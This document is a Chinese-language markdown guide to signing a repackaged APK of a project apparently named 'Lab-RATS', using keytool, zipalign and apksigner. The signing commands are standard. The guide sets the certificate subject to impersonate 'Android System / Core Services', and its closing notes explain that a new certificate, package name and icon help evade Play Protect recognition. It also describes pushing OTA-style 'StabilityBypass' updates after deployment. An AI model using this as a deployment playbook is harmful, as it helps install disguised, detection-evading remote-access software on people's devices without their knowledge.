# KEYSTORE.md — 新密钥库生成 + zipalign + apksigner 签名

> 适用：Lab-RATS v1.6 重打包上线前。原仓库 `apk-builder/build.ps1` 会用弱默认值
> （alias `lab-rats-key`、密码 `lab-rats123`，见 `app/build.gradle:58-61`）生成密钥。
> 上线部署必须重新生成唯一密钥并对 APK 重新签名。

## 1. 生成新 keystore（keytool，JDK 17/21 自带）

```powershell
# 在仓库根执行
keytool -genkeypair -v `
  -keystore my-release-key.jks `
  -alias myalias `
  -keyalg RSA -keysize 4096 `
  -validity 10000 `
  -storepass '<强密码-至少16位>' `
  -keypass '<强密码-至少16位>' `
  -dname "CN=Android System, OU=Core Services, O=Example Ltd, L=Seoul, ST=Seoul, C=KR"

# 校验
keytool -list -v -keystore my-release-key.jks -alias myalias -storepass '<强密码>'
```

要点：
- **不要**沿用 `lab-rats-keystore.jks` / `lab-rats123`（README 与 build.ps1 的公开默认值）。
- 密码只存在于本机 `keystore.properties`；该文件不进版本库（确认在 .gitignore）。

## 2. 写入 keystore.properties（app/build.gradle 读取）

```powershell
Set-Content -Path .\keystore.properties -Value @"
storeFile=my-release-key.jks
storePassword=<强密码>
keyAlias=myalias
keyPassword=<强密码>
"@
```

`app/build.gradle:54-64` 的 `signingConfigs.release` 会读取它；`release` 构建自动签名。
（若不想用 Gradle 签名，跳过此步，直接用下面第 4 步的 apksigner。）

## 3. 构建

```powershell
.\gradlew.bat assembleRelease
# 产物: app\build\outputs\apk\release\app-release.apk
```

## 4. zipalign + apksigner（手动签名流程，Gradle 未签名时）

```powershell
$SDK = "$env:LOCALAPPDATA\Android\Sdk\build-tools\34.0.0"   # 按实际 build-tools 版本
$IN  = "app\build\outputs\apk\release\app-release-unsigned.apk"
$AL  = "app\build\outputs\apk\release\app-release-aligned.apk"
$OUT = "signed_final.apk"

# 4.1 对齐（4 字节边界；APK 必须先对齐再签名）
& "$SDK\zipalign.exe" -v -p 4 $IN $AL

# 4.2 V2/V3 全量签名（minSdk 21 同时加 V1，兼容旧设备）
& "$SDK\apksigner.bat" sign --ks my-release-key.jks --ks-key-alias myalias `
  --ks-pass pass:"<强密码>" --key-pass pass:"<强密码>" `
  --v1-signing-enabled true --v2-signing-enabled true --v3-signing-enabled true `
  --out $OUT $AL

# 4.3 验证
& "$SDK\apksigner.bat" verify --verbose --print-certs $OUT
& "$SDK\zipalign.exe" -c -v 4 $OUT
```

## 5. 注意事项

1. **签名后再改名/改内容必须重签**；校验会失败。
2. **升级包要求同证书**：部署后如需 OTA 式更新（本项目的 StabilityBypass/重打包更新），
   必须一直使用本 keystore，否则 Android 拒绝覆盖安装。
3. **密钥备份**：keystore 丢失 = 无法推送更新，只能重装。
4. Play 保护识别：全新 4096-bit 证书 + 新包名 + 新 icon 是必要的（不能 100% 保证），
   配合 `patches/HARDEN.md` 全量身份替换。
5. `apk-builder/build.ps1` 的 `New-Keystore`（73-95 行）仍会生成弱默认值；
   上线流程请直接使用本文件命令，勿走 builder 的 keystore 菜单。
